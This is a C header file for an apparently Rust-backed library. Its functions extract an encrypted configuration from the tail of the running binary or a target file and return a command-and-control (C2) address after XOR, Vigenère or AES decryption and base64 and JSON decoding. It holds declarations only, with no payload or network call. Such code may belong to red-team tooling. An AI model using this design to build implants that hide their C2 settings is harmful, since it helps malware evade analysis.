#ifndef __CFGPARSER_H
#define __CFGPARSER_H

#define ENCTYPE_XOR 0
#define ENCTYPE_VIGINERE 1
#define ENCTYPE_AES 2

#ifdef __cplusplus
extern "C"
{
#endif

    /*
    function designed to read the end of the current binary and
    extract configuration information from it. this will return
    the C2 address in the form "<scheme>://<ip>:<port>".

    the extracted bytes are XOR-decrypted and base64-decoded before
    being JSON deserialized into a configuration struct. the information
    in this struct is then used to build the string that gets
    returned by the function.

    note: if the key passed in is NULL, a default of 'q' will be used
    when attempting to decrypt the bytes.
    */
    extern char *read_cfg(char *key);

    /*
    function designed to read the end of the current binary and
    extract configuration information from it. this will return
    the C2 address in the form "<scheme>://<ip>:<port>".

    the extracted bytes are decrypted and base64-decoded before
    being JSON deserialized into a configuration struct. the information
    in this struct is then used to build the string that gets
    returned by the function.

    the type of encryption is specified by the "enc_type" argument.
    */
    extern char *read_cfg_with_encryption(char *key, int enc_type);

    /*
    function designed to read the end of a target file and
    extract configuration information from it. this will return
    the C2 address in the form "<scheme>://<ip>:<port>".

    the extracted bytes are XOR-decrypted and base64-decoded before
    being JSON deserialized into a configuration struct. the information
    in this struct is then used to build the string that gets
    returned by the function.

    note: if the key passed in is NULL, a default of 'q' will be used
    when attempting to decrypt the bytes.
    */
    extern char *read_cfg_from_file(char *filename, char *key);

    /*
    function designed to read the end of a target file and
    extract configuration information from it. this will return
    the C2 address in the form "<scheme>://<ip>:<port>".

    the extracted bytes are decrypted and base64-decoded before
    being JSON deserialized into a configuration struct. the information
    in this struct is then used to build the string that gets
    returned by the function.

    the type of encryption is specified by the "enc_type" argument.
    */
    extern char *read_cfg_from_file_with_encryption(char *filename, char *key, int enc_type);

    /*
    function designed to free memory that was originally allocated
    by rust. since the pointer was created by the rust library, the
    rust library still owns that memory and, therefore, must be freed
    by the library.
    */
    extern void free_memory(char *ptr);

#ifdef __cplusplus
}
#endif

#endif // __CFGPARSER_H
